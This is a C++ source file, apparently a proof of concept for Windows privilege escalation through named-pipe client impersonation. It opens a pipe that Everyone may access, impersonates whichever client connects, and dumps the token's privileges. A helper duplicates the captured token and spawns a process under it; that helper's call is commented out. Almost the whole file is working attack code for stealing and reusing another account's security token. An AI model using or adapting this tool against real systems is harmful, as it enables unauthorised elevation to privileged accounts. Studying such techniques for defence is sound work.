//Author : Crispr
//Data   : 2021.10.5

#include <iostream>
#include <Windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <vector>
#include <strsafe.h>
#include <sddl.h>
#include <userenv.h>
#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "userenv.lib")

using namespace std;



void print_tokenInformation(HANDLE hToken) 
{
    DWORD size = 0;
    if (!GetTokenInformation(hToken, TokenStatistics, NULL, 0, &size) && GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
        PTOKEN_STATISTICS ts = (PTOKEN_STATISTICS)malloc(size);
        if (ts != NULL && GetTokenInformation(hToken, TokenStatistics, ts, size, &size)) {
            printf("[+]ImpersonationLevel: ");
            switch (ts->ImpersonationLevel)
            {
            case 0:
                printf("Level:0 SecurityAnonymous\n");
                break;
            case 1:
                printf("Level:1 SecurityIdentification\n");
                break;
            case 2:
                printf("Level:2 SecurityImpersonation\n");
                break;
            case 3:
                printf("Level:3 SecurityDelegation\n");
                break;
            }
            printf("[+]TokenType: ");
            switch (ts->TokenType)
            {
            case 1:
                printf("Type1 (TokenPrimary)\n");
                break;
            case 2:
                printf("Type2 (TokenImpersonation)\n");
                break;
            }
        }
    }
}

void print_privileges(HANDLE hToken)
{
    DWORD size = 0;
    if (!GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &size) && GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
        PTOKEN_PRIVILEGES tp = (PTOKEN_PRIVILEGES)malloc(size);
        if (tp != NULL && GetTokenInformation(hToken, TokenPrivileges, tp, size, &size)) {
            size_t i;
            printf("[+]Privileges information: \n");
            for (i = 0; i < tp->PrivilegeCount; ++i) {
                char name[64*8] = "?";
                DWORD name_size = sizeof name;
                LookupPrivilegeNameA(0, &tp->Privileges[i].Luid, name, &name_size);
                PRIVILEGE_SET ps = {
                    1, PRIVILEGE_SET_ALL_NECESSARY, {
                        { { tp->Privileges[i].Luid.LowPart, tp->Privileges[i].Luid.HighPart } }
                    }
                };
                BOOL fResult;
                PrivilegeCheck(hToken, &ps, &fResult);
                printf("%-*s %s\n", 32, name, fResult ? "Enabled" : "Disabled");
            }
        }
        free(tp);
    }
}

void DoSomethingAsImpersonatedUser(HANDLE hToken)
{
    DWORD dwCreationFlags = 0;
    dwCreationFlags = CREATE_UNICODE_ENVIRONMENT;
    BOOL g_bInteractWithConsole = TRUE;
    LPWSTR pwszCurrentDirectory = NULL;
    dwCreationFlags |= g_bInteractWithConsole ? 0 : CREATE_NEW_CONSOLE;
    LPVOID lpEnvironment = NULL;
    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFO si = { 0 };
    
    HANDLE hSystemTokenDup = INVALID_HANDLE_VALUE;
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hSystemTokenDup))
    {
        wprintf(L"DuplicateTokenEx() failed. Error: %d\n", GetLastError());
        CloseHandle(hToken);
        return;
    }
        wprintf(L"DuplicateTokenEx() OK\n");
    if (!CreateProcessWithTokenW(hSystemTokenDup, LOGON_WITH_PROFILE, NULL, L"notepad.exe", dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &si, &pi))
    {
        wprintf(L"CreateProcessWithTokenW() failed. Error: %d\n", GetLastError());
        CloseHandle(hSystemTokenDup);
        return;
    }
    else
    {
        wprintf(L"[+] CreateProcessWithTokenW() OK\n");
        return;
    }
}

int wmain(int argc, wchar_t* argv[])
{
    TOKEN_GROUPS* group_token = NULL;

    HANDLE hPipe = INVALID_HANDLE_VALUE;
    LPWSTR pwszPipeName = argv[1];
    SECURITY_DESCRIPTOR sd = { 0 };
    SECURITY_ATTRIBUTES sa = { 0 };
    DWORD buffer_size = 0;
    HANDLE hToken = INVALID_HANDLE_VALUE;
    if (!InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION))
    {
        wprintf(L"InitializeSecurityDescriptor() failed. Error: %d - ", GetLastError());
        free(pwszPipeName);
        return -1;
    }
    
    if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(L"D:(A;OICI;GA;;;WD)", 1, &((&sa)->lpSecurityDescriptor), NULL))
    {
        wprintf(L"ConvertStringSecurityDescriptorToSecurityDescriptor() failed. Error: %d\n", GetLastError());
        free(pwszPipeName);
        return NULL;
    }

    if ((hPipe = CreateNamedPipe(pwszPipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_WAIT, 10, 2048, 2048, 0, &sa)) != INVALID_HANDLE_VALUE) {
        wprintf(L"[*] Named pipe '%ls' listening...\n", pwszPipeName);
        ConnectNamedPipe(hPipe, NULL);
        wprintf(L"[+] A client connected!\n");

        if (ImpersonateNamedPipeClient(hPipe)) {
            if (OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken)) {
                print_tokenInformation(hToken);
                print_privileges(hToken);
                //DoSomethingAsImpersonatedUser(hToken);
            }
        }
    }

    CloseHandle(hPipe);
    return 0;
}

